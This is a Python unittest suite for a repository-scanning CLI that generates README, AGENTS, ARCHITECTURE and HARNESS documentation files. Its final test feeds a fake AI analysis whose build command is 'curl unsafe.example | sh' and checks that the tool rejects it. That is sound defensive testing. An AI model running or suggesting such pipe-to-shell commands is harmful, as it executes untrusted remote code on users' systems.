import io
import codecs
import json
import stat
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest.mock import patch

from context.cli import main
from context.evidence import collect_repository_evidence


class ContextCliTests(unittest.TestCase):
    def create_native_bridge_repo(self, repo_root: Path) -> None:
        """Generic WPF + C++/CLI native bridge project fixture."""
        (repo_root / "AppClient" / "Service").mkdir(parents=True)
        (repo_root / "AppFramework" / "Service").mkdir(parents=True)
        (repo_root / "NativeBridge").mkdir(parents=True)
        (repo_root / "AppClient" / "App").mkdir(parents=True)
        (repo_root / "AppClient" / "ViewModel").mkdir(parents=True)

        (repo_root / "DemoClient.sln").write_text("", encoding="utf-8")
        (repo_root / "DemoClient.csproj").write_text(
            "<Project Sdk=\"Microsoft.NET.Sdk.WindowsDesktop\"><PropertyGroup><UseWPF>true</UseWPF></PropertyGroup></Project>",
            encoding="utf-8",
        )
        (repo_root / "NativeBridge" / "NativeBridge.vcxproj").write_text(
            "<Project><ItemDefinitionGroup><ClCompile><CompileAsManaged>true</CompileAsManaged></ClCompile></ItemDefinitionGroup></Project>",
            encoding="utf-8",
        )
        (repo_root / "AppClient" / "Service" / "CallService.cs").write_text(
            "namespace AppClient.Service { class CallService { void Start() { var service = ServiceFactory.getService(); service?.StartCall(); } } }",
            encoding="utf-8",
        )
        (repo_root / "AppFramework" / "Service" / "IAppService.cs").write_text(
            "namespace AppFramework.Service { public interface IAppService { void StartCall(); } }",
            encoding="utf-8",
        )
        (repo_root / "NativeBridge" / "bridge.cpp").write_text(
            "#include <windows.h>\nvoid StartCallNative() {}\n",
            encoding="utf-8",
        )
        (repo_root / "AppClient" / "App" / "App.xaml.cs").write_text(
            "using System.Windows; class App : Application {}",
            encoding="utf-8",
        )
        (repo_root / "AppClient" / "App" / "AppUICallback.cs").write_text(
            "class AppUICallback : IServiceObserver { void OnLogin() { DispatcherHelper.CheckBeginInvokeOnUI(() => {}); } }",
            encoding="utf-8",
        )
        (repo_root / "AppClient" / "App" / "AppUIState.cs").write_text(
            "class AppUIState { private static AppUIState mInstance; }",
            encoding="utf-8",
        )
        (repo_root / "AppFramework" / "Utils").mkdir(parents=True)
        (repo_root / "AppFramework" / "Utils" / "VersionUtil.cs").write_text(
            "class VersionUtil { public static bool IsPrivateCloudVersion() => true; }",
            encoding="utf-8",
        )
        (repo_root / "AppFramework" / "Interop").mkdir(parents=True)
        (repo_root / "AppFramework" / "Interop" / "NativeMethods.cs").write_text(
            "using System; using System.Runtime.InteropServices; class NativeMethods { [DllImport(\"user32.dll\")] public static extern IntPtr FindWindow(string a, string b); [return: MarshalAs(UnmanagedType.Bool)] public static extern bool NativeBool(); }",
            encoding="utf-8",
        )
        (repo_root / "AppFramework" / "Interop" / "NativeObserver.cs").write_text(
            "delegate void NativeCallback(); class NativeObserver {}",
            encoding="utf-8",
        )

    def create_win32_app_repo(self, repo_root: Path) -> None:
        (repo_root / "src").mkdir(parents=True)
        (repo_root / "res").mkdir(parents=True)

        (repo_root / "Win32Demo.sln").write_text("", encoding="utf-8")
        (repo_root / "src" / "Win32Demo.vcxproj").write_text(
            "<Project><ItemGroup><ClCompile Include=\"main.cpp\" /></ItemGroup></Project>",
            encoding="utf-8",
        )
        (repo_root / "src" / "main.cpp").write_text(
            "#include <windows.h>\nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) { return 0; }\n",
            encoding="utf-8",
        )
        (repo_root / "res" / "app.rc").write_text("IDI_APP_ICON ICON \"app.ico\"\n", encoding="utf-8")

    def create_harmony_repo(self, repo_root: Path) -> None:
        (repo_root / "entry" / "src" / "main").mkdir(parents=True)
        (repo_root / "buildScript").mkdir(parents=True)
        (repo_root / "hvigorfile.ts").write_text("export default {};\n", encoding="utf-8")
        (repo_root / "build-profile.json5").write_text("{ app: {} }\n", encoding="utf-8")
        (repo_root / "module.json5").write_text("{ module: {} }\n", encoding="utf-8")
        (repo_root / "entry" / "src" / "main" / "module.ets").write_text("export default {};\n", encoding="utf-8")
        # Use generic *_package.py naming (no company-specific prefix)
        (repo_root / "buildScript" / "app_package.py").write_text("print('package')\n", encoding="utf-8")
        (repo_root / "buildScript" / "info.dat").write_text("major=1\nminor=0\nrevision=0\n", encoding="utf-8")
        (repo_root / "buildScript" / "app_build.sh").write_text(
            "#!/bin/bash\ncd ../entry\nohpm install\ncd ..\nhvigorw clean --no-daemon\nhvigorw assembleHap --mode module -p product=default -p buildMode=release --no-daemon\n",
            encoding="utf-8",
        )

    def create_qt_cpp_repo(self, repo_root: Path) -> None:
        (repo_root / "src").mkdir(parents=True)
        (repo_root / "shared_cpp" / "include").mkdir(parents=True)
        (repo_root / "shared_cpp" / "src").mkdir(parents=True)
        (repo_root / "tests").mkdir(parents=True)

        (repo_root / "CMakeLists.txt").write_text(
            "\n".join(
                [
                    "cmake_minimum_required(VERSION 3.20)",
                    "project(QtClient)",
                    "find_package(Qt6 REQUIRED COMPONENTS Widgets)",
                    "add_library(core shared_cpp/src/core.cpp)",
                    "target_include_directories(core PUBLIC shared_cpp/include)",
                    "add_executable(qt_client src/main.cpp src/call_controller.cpp)",
                    "target_link_libraries(qt_client PRIVATE Qt6::Widgets core)",
                    "enable_testing()",
                    "add_test(NAME qt_smoke COMMAND qt_client --smoke)",
                    "",
                ]
            ),
            encoding="utf-8",
        )
        (repo_root / "src" / "main.cpp").write_text(
            "#include <QApplication>\n#include \"call_controller.h\"\nint main(int argc, char** argv) { QApplication app(argc, argv); return 0; }\n",
            encoding="utf-8",
        )
        (repo_root / "src" / "call_controller.cpp").write_text(
            "#include \"call_controller.h\"\n#include \"core.h\"\nvoid CallController::startCall() { core_start_call(); }\n",
            encoding="utf-8",
        )
        (repo_root / "src" / "call_controller.h").write_text(
            "class CallController { public: void startCall(); };\n",
            encoding="utf-8",
        )
        (repo_root / "shared_cpp" / "include" / "core.h").write_text(
            "#pragma once\nextern \"C\" int core_start_call();\n",
            encoding="utf-8",
        )
        (repo_root / "shared_cpp" / "src" / "core.cpp").write_text(
            "#include \"core.h\"\nint core_start_call() { return 0; }\n",
            encoding="utf-8",
        )

    def create_fastapi_repo(self, repo_root: Path) -> None:
        (repo_root / "app" / "routers").mkdir(parents=True)
        (repo_root / "app" / "services").mkdir(parents=True)
        (repo_root / "tests").mkdir()
        (repo_root / "requirements.txt").write_text(
            "fastapi==0.115.0\nuvicorn[standard]==0.30.6\n",
            encoding="utf-8",
        )
        (repo_root / "requirements-dev.txt").write_text("pytest==9.0.3\n", encoding="utf-8")
        (repo_root / "main.py").write_text(
            "from fastapi import FastAPI\n"
            "from app.routers import users\n\n"
            "app = FastAPI()\n"
            "app.include_router(users.router)\n",
            encoding="utf-8",
        )
        (repo_root / "app" / "routers" / "users.py").write_text(
            "from fastapi import APIRouter\n\nrouter = APIRouter()\n",
            encoding="utf-8",
        )
        (repo_root / "app" / "services" / "users.py").write_text(
            "def list_users():\n    return []\n",
            encoding="utf-8",
        )
        (repo_root / "tests" / "test_users.py").write_text(
            "def test_users():\n    assert True\n",
            encoding="utf-8",
        )

    def test_scan_writes_missing_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            (repo_root / "src").mkdir()
            (repo_root / "src" / "index.ts").write_text("export const demo = 1;\n", encoding="utf-8")

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            self.assertTrue((repo_root / "README.md").exists())
            self.assertTrue((repo_root / "AGENTS.md").exists())
            self.assertTrue((repo_root / "ARCHITECTURE.md").exists())
            self.assertTrue((repo_root / "HARNESS.md").exists())
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("项目类型", harness_content)
            self.assertIn("构建命令", harness_content)

    def test_scan_links_agents_to_harness_contract(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("构建与验证契约（AI 必读）", agents_content)
            self.assertIn("执行构建、测试或验证命令前，必须读取项目根目录的 `HARNESS.md`", agents_content)
            self.assertIn("不得猜测、替换或覆盖", agents_content)
            self.assertIn("`Unknown` 或 `Missing`", agents_content)
            self.assertIn("# HARNESS — 项目构建与验证契约", harness_content)
            self.assertIn("构建、验证和执行环境的唯一事实源", harness_content)

    def test_scan_creates_markerless_context_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            for file_name in ("README.md", "AGENTS.md", "ARCHITECTURE.md", "HARNESS.md"):
                content = (repo_root / file_name).read_text(encoding="utf-8")
                self.assertNotIn("<!-- dev-harness:managed:", content, file_name)
            self.assertIn("## 项目规范索引", (repo_root / "AGENTS.md").read_text(encoding="utf-8"))
            self.assertIn("## 项目类型", (repo_root / "HARNESS.md").read_text(encoding="utf-8"))

    def test_scan_indexes_known_contract_documents(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "docs").mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            for relative in ("docs/GIT_WORKFLOW.md", "docs/CODE_STYLE.md", "docs/RELEASE.md", "CHANGELOG.md"):
                (repo_root / relative).write_text(f"# {relative}\n", encoding="utf-8")

            self.assertEqual(main(["scan", str(repo_root)]), 0)

            agents = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            for relative in ("HARNESS.md", "docs/GIT_WORKFLOW.md", "docs/CODE_STYLE.md", "docs/RELEASE.md", "CHANGELOG.md"):
                self.assertIn(f"`{relative}`", agents)

    def test_refresh_updates_only_contract_index_after_document_is_added(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            self.assertEqual(main(["scan", str(repo_root)]), 0)
            agents_path = repo_root / "AGENTS.md"
            agents_path.write_text(
                agents_path.read_text(encoding="utf-8") + "\n团队自定义内容\n",
                encoding="utf-8",
            )
            (repo_root / "docs").mkdir()
            (repo_root / "docs" / "GIT_WORKFLOW.md").write_text("# Team Git\n", encoding="utf-8")

            self.assertEqual(main(["refresh", str(repo_root), "--force"]), 0)

            agents = agents_path.read_text(encoding="utf-8")
            self.assertIn("- Git 工作流：`docs/GIT_WORKFLOW.md`", agents)
            self.assertIn("团队自定义内容", agents)

    def test_refresh_reports_conflicting_contract_references_for_manual_review(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            self.assertEqual(main(["scan", str(repo_root)]), 0)
            for directory in ("team-a", "team-b"):
                (repo_root / directory).mkdir()
                (repo_root / directory / "GIT.md").write_text(f"# {directory}\n", encoding="utf-8")
            agents_path = repo_root / "AGENTS.md"
            agents_path.write_text(
                agents_path.read_text(encoding="utf-8").replace(
                    "- Git 工作流：Unknown",
                    "- Git 工作流：`team-a/GIT.md`\n- Git 工作流：`team-b/GIT.md`",
                    1,
                ),
                encoding="utf-8",
            )

            self.assertEqual(main(["refresh", str(repo_root), "--force"]), 0)

            agents = agents_path.read_text(encoding="utf-8")
            self.assertIn("- Git 工作流：Unknown", agents)
            self.assertIn("Git 工作流存在多个有效规范引用，需人工选择权威文档", agents)
            self.assertNotIn(
                "Git 工作流存在多个有效规范引用，需人工选择权威文档",
                (repo_root / "HARNESS.md").read_text(encoding="utf-8"),
            )

    def test_refresh_updates_only_fixed_sections_and_preserves_user_content(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            self.assertEqual(main(["scan", str(repo_root)]), 0)
            readme_path = repo_root / "README.md"
            readme_path.write_text(
                readme_path.read_text(encoding="utf-8") + "\n## 团队备注\n不要改动这里。\n",
                encoding="utf-8",
            )
            before = readme_path.read_bytes()
            (repo_root / "CMakeLists.txt").write_text("project(Demo)\n", encoding="utf-8")

            preview = io.StringIO()
            with redirect_stdout(preview):
                preview_exit = main(["refresh", str(repo_root)])

            self.assertEqual(preview_exit, 2)
            self.assertEqual(readme_path.read_bytes(), before)
            self.assertIn("readme.build-systems", preview.getvalue())
            self.assertIn("README.md:readme.build-systems (existing)", preview.getvalue())

            with patch("sys.stdin.isatty", return_value=True), patch("builtins.input", return_value="all"):
                self.assertEqual(main(["refresh", str(repo_root)]), 0)
            refreshed = readme_path.read_text(encoding="utf-8")
            self.assertIn("CMake", refreshed)
            self.assertIn("## 团队备注\n不要改动这里。\n", refreshed)

    def test_refresh_preserves_confirmed_harness_commands_between_managed_sections(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            self.assertEqual(main(["scan", str(repo_root)]), 0)
            harness_path = repo_root / "HARNESS.md"
            harness_path.write_text(
                harness_path.read_text(encoding="utf-8").replace(
                    "## 已确认命令（人工维护）\n\n- **build**: `Unknown`",
                    "## 已确认命令（人工维护）\n\n- **build**: `team-build`",
                    1,
                ),
                encoding="utf-8",
            )
            (repo_root / "CMakeLists.txt").write_text("project(Demo)\n", encoding="utf-8")

            self.assertEqual(main(["refresh", str(repo_root), "--force"]), 0)

            harness = harness_path.read_text(encoding="utf-8")
            self.assertIn("## 已确认命令（人工维护）\n\n- **build**: `team-build`", harness)

    def test_refresh_force_preserves_format_final_newline_and_mode(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            self.assertEqual(main(["scan", str(repo_root)]), 0)
            agents_path = repo_root / "AGENTS.md"
            text = agents_path.read_text(encoding="utf-8").rstrip("\n") + "\n\n团队自定义内容"
            agents_path.write_bytes(codecs.BOM_UTF8 + text.replace("\n", "\r\n").encode("utf-8"))
            agents_path.chmod(0o640)
            (repo_root / "CMakeLists.txt").write_text("project(Demo)\n", encoding="utf-8")

            self.assertEqual(main(["refresh", str(repo_root), "--force"]), 0)

            raw = agents_path.read_bytes()
            self.assertTrue(raw.startswith(codecs.BOM_UTF8))
            self.assertNotIn(b"\n", raw.replace(b"\r\n", b""))
            self.assertFalse(raw.endswith(b"\r\n"))
            self.assertIn("团队自定义内容", raw[len(codecs.BOM_UTF8) :].decode("utf-8"))
            self.assertEqual(stat.S_IMODE(agents_path.stat().st_mode), 0o640)

    def test_refresh_rejects_missing_duplicate_or_renamed_managed_heading(self) -> None:
        corruptions = (
            lambda text: text.replace("## 编程语言", "## 技术语言", 1),
            lambda text: text + "\n## 编程语言\n重复章节\n",
            lambda text: text.replace("## 编程语言", "### 编程语言", 1),
        )
        for corrupt in corruptions:
            with self.subTest(corrupt=corrupt), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp) / "demo-repo"
                repo_root.mkdir()
                (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
                self.assertEqual(main(["scan", str(repo_root)]), 0)
                readme_path = repo_root / "README.md"
                readme_path.write_text(corrupt(readme_path.read_text(encoding="utf-8")), encoding="utf-8")
                before = readme_path.read_bytes()

                self.assertEqual(main(["refresh", str(repo_root), "--force"]), 1)
                self.assertEqual(readme_path.read_bytes(), before)

    def test_legacy_marker_migration_removes_markers_and_preserves_user_sections(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            self.assertEqual(main(["scan", str(repo_root)]), 0)
            readme_path = repo_root / "README.md"
            legacy = readme_path.read_text(encoding="utf-8").replace(
                "## 编程语言",
                "<!-- dev-harness:managed:start id=readme.detected-context version=1 -->\n## 编程语言",
                1,
            )
            legacy += "<!-- dev-harness:managed:end id=readme.detected-context -->\n"
            legacy = legacy.replace("## 项目简介\nUnknown", "## 项目简介\n团队维护的项目说明")
            readme_path.write_text(legacy, encoding="utf-8")

            self.assertEqual(main(["refresh", str(repo_root), "--force"]), 0)

            migrated = readme_path.read_text(encoding="utf-8")
            self.assertIn("## 项目简介\n团队维护的项目说明", migrated)
            self.assertNotIn("dev-harness:managed", migrated)
            self.assertEqual(migrated.count("## 编程语言"), 1)

    def test_refresh_rejects_malformed_markers_without_writing(self) -> None:
        corruptions = (
            lambda text: text.replace("version=1", "version=2", 1),
            lambda text: text.replace("id=agents.contract-index -->", "id=wrong -->", 1),
            lambda text: text.replace("<!-- dev-harness:managed:end id=agents.contract-index -->\n", "", 1),
            lambda text: text + text,
            lambda text: text.replace(
                "<!-- dev-harness:managed:start id=agents.contract-index version=1 -->",
                "<!-- dev-harness:managed:start id=agents.contract-index version=1 -->\n"
                "<!-- dev-harness:managed:start id=nested version=1 -->",
                1,
            ),
        )
        for corrupt in corruptions:
            with self.subTest(corrupt=corrupt), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp) / "demo-repo"
                repo_root.mkdir()
                (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
                self.assertEqual(main(["scan", str(repo_root)]), 0)
                agents_path = repo_root / "AGENTS.md"
                legacy = agents_path.read_text(encoding="utf-8").replace(
                    "## 项目规范索引",
                    "<!-- dev-harness:managed:start id=agents.contract-index version=1 -->\n## 项目规范索引",
                    1,
                ).replace(
                    "## 构建与验证契约（AI 必读）",
                    "<!-- dev-harness:managed:end id=agents.contract-index -->\n## 构建与验证契约（AI 必读）",
                    1,
                )
                agents_path.write_text(corrupt(legacy), encoding="utf-8")
                before = agents_path.read_bytes()

                self.assertEqual(main(["refresh", str(repo_root), "--force"]), 1)
                self.assertEqual(agents_path.read_bytes(), before)

    def test_refresh_rejects_mixed_line_endings_and_unknown_encoding(self) -> None:
        for raw in (b"A\r\nB\n", b"\xff\xfe\x00"):
            with self.subTest(raw=raw), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp) / "demo-repo"
                repo_root.mkdir()
                (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
                self.assertEqual(main(["scan", str(repo_root)]), 0)
                agents_path = repo_root / "AGENTS.md"
                agents_path.write_bytes(raw)

                self.assertEqual(main(["refresh", str(repo_root), "--force"]), 1)
                self.assertEqual(agents_path.read_bytes(), raw)

    def test_scan_summarizes_diff_without_overwriting_existing_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "demo-repo"
            repo_root.mkdir()
            (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
            (repo_root / "README.md").write_text("# Existing\n", encoding="utf-8")

            buffer = io.StringIO()
            with redirect_stdout(buffer):
                exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 2)
            self.assertEqual((repo_root / "README.md").read_text(encoding="utf-8"), "# Existing\n")
            self.assertIn("README.md", buffer.getvalue())
            self.assertIn("diff", buffer.getvalue().lower())

    def test_scan_never_overwrites_existing_files_even_with_force(self) -> None:
        for extra_args in ([], ["--force"]):
            with self.subTest(extra_args=extra_args), tempfile.TemporaryDirectory() as tmp:
                repo_root = Path(tmp) / "demo-repo"
                repo_root.mkdir()
                (repo_root / "package.json").write_text('{"name":"demo-repo"}', encoding="utf-8")
                readme_path = repo_root / "README.md"
                original = b"# Human README\n"
                readme_path.write_bytes(original)

                exit_code = main(["scan", str(repo_root), *extra_args])

                self.assertEqual(exit_code, 2)
                self.assertEqual(readme_path.read_bytes(), original)

    def test_scan_detects_wpf_project_and_dotnet_commands_in_harness(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "wpf-demo"
            repo_root.mkdir()
            (repo_root / "Demo.sln").write_text(
                'Project("{GUID}") = "Demo", "Demo.csproj", "{GUID}"\nEndProject\n',
                encoding="utf-8",
            )
            (repo_root / "Demo.csproj").write_text(
                "<Project Sdk=\"Microsoft.NET.Sdk.WindowsDesktop\"></Project>",
                encoding="utf-8",
            )
            (repo_root / "App.xaml").write_text("<Application />", encoding="utf-8")
            (repo_root / "MainWindow.xaml").write_text("<Window />", encoding="utf-8")

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("WPF", harness_content)
            self.assertIn("dotnet build Demo.csproj", harness_content)
            self.assertIn("dotnet build Demo.sln", harness_content)
            self.assertIn("编译启动诊断", harness_content)
            self.assertIn("RecommendedTerminal", harness_content)
            self.assertIn("Windows PowerShell 7 或 cmd", harness_content)
            self.assertIn("dotnet --info", harness_content)
            self.assertNotIn("dotnet test", harness_content)

    def test_scan_marks_wpf_build_as_not_runnable_inside_wsl(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "wpf-wsl-demo"
            repo_root.mkdir()
            (repo_root / "Demo.csproj").write_text(
                "<Project Sdk=\"Microsoft.NET.Sdk.WindowsDesktop\"><PropertyGroup><UseWPF>true</UseWPF></PropertyGroup></Project>",
                encoding="utf-8",
            )
            (repo_root / "App.xaml").write_text("<Application />", encoding="utf-8")

            with patch("context.cli.is_wsl_host", return_value=True):
                exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("CanRunBuildHere**: no", harness_content)
            self.assertIn("当前宿主是 WSL", harness_content)
            self.assertIn("Windows 客户端编译链", harness_content)

    def test_scan_detects_fastapi_project_and_python_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "fastapi-demo"
            repo_root.mkdir()
            self.create_fastapi_repo(repo_root)

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            readme_content = (repo_root / "README.md").read_text(encoding="utf-8")
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            architecture_content = (repo_root / "ARCHITECTURE.md").read_text(encoding="utf-8")
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")

            self.assertIn("FastAPI", harness_content)
            self.assertIn("BuildCommand**: N/A", harness_content)
            self.assertIn("项目无独立编译或打包步骤", harness_content)
            self.assertIn("python -m pytest -q", harness_content)
            self.assertIn("- **test**: `python -m pytest -q`", harness_content)
            self.assertIn("python -m uvicorn main:app --reload", readme_content)
            self.assertIn("Python + FastAPI", agents_content)
            self.assertIn("main.py", agents_content)
            self.assertIn("main.py -> app/routers -> app/services", agents_content)
            self.assertIn("FastAPI modular service", architecture_content)

    def test_scan_python_service_avoids_template_noise_and_finds_runtime_risks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "python-service"
            (repo_root / "app" / "api").mkdir(parents=True)
            (repo_root / "data").mkdir()
            (repo_root / "logs").mkdir()
            (repo_root / "deploy" / "windows").mkdir(parents=True)
            (repo_root / "requirements.txt").write_text("fastapi\npytest\n", encoding="utf-8")
            (repo_root / "app" / "main.py").write_text(
                "from fastapi import FastAPI\n"
                "def create_app():\n"
                "    app = FastAPI()\n"
                "    Base.metadata.create_all(engine)\n"
                "    app.include_router(router)\n"
                "    return app\n",
                encoding="utf-8",
            )
            (repo_root / "app" / "api" / "requirements.py").write_text(
                "import asyncio\n"
                "async def sync_requirement(request):\n"
                "    lock = asyncio.Lock()\n"
                "    for attempt in range(3):\n"
                "        await request.app.state.qa_client.find_latest_test_case('id')\n",
                encoding="utf-8",
            )
            (repo_root / "deploy" / "windows" / "install_service.ps1").write_text(
                "nssm install Demo\n",
                encoding="utf-8",
            )

            self.assertEqual(main(["scan", str(repo_root)]), 0)

            readme = (repo_root / "README.md").read_text(encoding="utf-8")
            agents = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            harness = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertTrue(readme.startswith("# python-service\n"))
            self.assertIn("构建: N/A（项目无独立编译或打包步骤）", readme)
            self.assertNotIn("data:", readme)
            self.assertNotIn("logs:", readme)
            self.assertNotIn("contains project files", readme)
            self.assertNotIn("contains submodules or grouped resources", readme)
            self.assertIn("**核心调用链**", agents)
            self.assertNotIn("*.h", agents)
            self.assertNotIn("*.cpp", agents)
            self.assertIn("app/main.py", agents)
            self.assertIn("app/api/requirements.py", agents)
            self.assertIn("**WorkingDirectory**: repository root", harness)
            self.assertNotIn(str(repo_root), harness)
            self.assertNotIn("- Unknown", harness)
            self.assertNotIn("### 快速验证命令\n`N/A", harness)
            high_risk = agents.split("## 5. 高风险文件标注", 1)[1].split("## 6.", 1)[0]
            self.assertNotIn("tests/", high_risk)

    def test_ai_analysis_supports_unfamiliar_framework_without_profile_code(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "nebula-demo"
            repo_root.mkdir()
            (repo_root / "src").mkdir()
            (repo_root / "src" / "bootstrap.nbl").write_text("start routes\n", encoding="utf-8")
            (repo_root / "src" / "routes.nbl").write_text("route /health\n", encoding="utf-8")
            (repo_root / "toolchain.conf").write_text("build=nebula build\ntest=nebula test\n", encoding="utf-8")
            evidence = collect_repository_evidence(repo_root)
            analysis_path = Path(tmp) / "analysis.json"
            analysis_path.write_text(
                json.dumps(
                    {
                        "schema_version": 1,
                        "evidence_fingerprint": evidence["evidence_fingerprint"],
                        "claims": {
                            "project_type": {
                                "value": "NebulaStack",
                                "confidence": "high",
                                "evidence": ["toolchain.conf:1"],
                            },
                            "project_summary": {
                                "value": "NebulaStack HTTP service.",
                                "confidence": "high",
                                "evidence": ["src/bootstrap.nbl:1", "src/routes.nbl:1"],
                            },
                            "language_framework": {
                                "value": "Nebula language + NebulaStack",
                                "confidence": "high",
                                "evidence": ["src/bootstrap.nbl:1"],
                            },
                            "architecture_pattern": {
                                "value": "Modular HTTP service",
                                "confidence": "medium",
                                "evidence": ["src/bootstrap.nbl:1", "src/routes.nbl:1"],
                            },
                            "core_entry": {
                                "value": "src/bootstrap.nbl",
                                "confidence": "high",
                                "evidence": ["src/bootstrap.nbl:1"],
                            },
                            "core_flow": {
                                "value": "src/bootstrap.nbl -> src/routes.nbl",
                                "confidence": "high",
                                "evidence": ["src/bootstrap.nbl:1", "src/routes.nbl:1"],
                            },
                            "build_command": {
                                "value": "nebula build",
                                "confidence": "high",
                                "evidence": ["toolchain.conf:1"],
                            },
                            "quick_command": {
                                "value": "nebula test",
                                "confidence": "high",
                                "evidence": ["toolchain.conf:2"],
                            },
                            "bugfix_command": {
                                "value": "nebula test",
                                "confidence": "high",
                                "evidence": ["toolchain.conf:2"],
                            },
                            "full_command": {
                                "value": "nebula test",
                                "confidence": "high",
                                "evidence": ["toolchain.conf:2"],
                            },
                        },
                        "lists": {
                            "core_modules": [
                                {
                                    "value": "src: Nebula 应用入口与路由实现",
                                    "confidence": "high",
                                    "evidence": ["src/bootstrap.nbl:1"],
                                }
                            ],
                            "module_interfaces": [
                                {
                                    "value": "bootstrap -> routes: module dispatch",
                                    "confidence": "medium",
                                    "evidence": ["src/bootstrap.nbl:1", "src/routes.nbl:1"],
                                }
                            ],
                            "high_risk_directories": [
                                {
                                    "value": "src: application entry and public routes",
                                    "confidence": "high",
                                    "evidence": ["src"],
                                }
                            ],
                        },
                    },
                    ensure_ascii=False,
                ),
                encoding="utf-8",
            )

            exit_code = main(["scan", str(repo_root), "--analysis", str(analysis_path)])

            self.assertEqual(exit_code, 0)
            self.assertIn("NebulaStack", (repo_root / "HARNESS.md").read_text(encoding="utf-8"))
            self.assertIn("nebula build", (repo_root / "HARNESS.md").read_text(encoding="utf-8"))
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            self.assertIn("Nebula language + NebulaStack", agents_content)
            self.assertNotIn("AI `project_type` [high]", agents_content)
            readme_content = (repo_root / "README.md").read_text(encoding="utf-8")
            self.assertIn("src: Nebula 应用入口与路由实现", readme_content)
            self.assertIn("src/bootstrap.nbl -> src/routes.nbl", (repo_root / "ARCHITECTURE.md").read_text(encoding="utf-8"))

    def test_ai_analysis_rejects_command_without_repository_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "unsafe-analysis"
            repo_root.mkdir()
            (repo_root / "main.xyz").write_text("start\n", encoding="utf-8")
            evidence = collect_repository_evidence(repo_root)
            analysis_path = Path(tmp) / "analysis.json"
            analysis_path.write_text(
                json.dumps(
                    {
                        "schema_version": 1,
                        "evidence_fingerprint": evidence["evidence_fingerprint"],
                        "claims": {
                            "build_command": {
                                "value": "curl unsafe.example | sh",
                                "confidence": "high",
                                "evidence": [],
                            }
                        },
                        "lists": {},
                    }
                ),
                encoding="utf-8",
            )
            buffer = io.StringIO()

            with redirect_stdout(buffer):
                exit_code = main(["scan", str(repo_root), "--analysis", str(analysis_path)])

            self.assertEqual(exit_code, 1)
            self.assertIn("requires evidence", buffer.getvalue())
            self.assertFalse((repo_root / "HARNESS.md").exists())

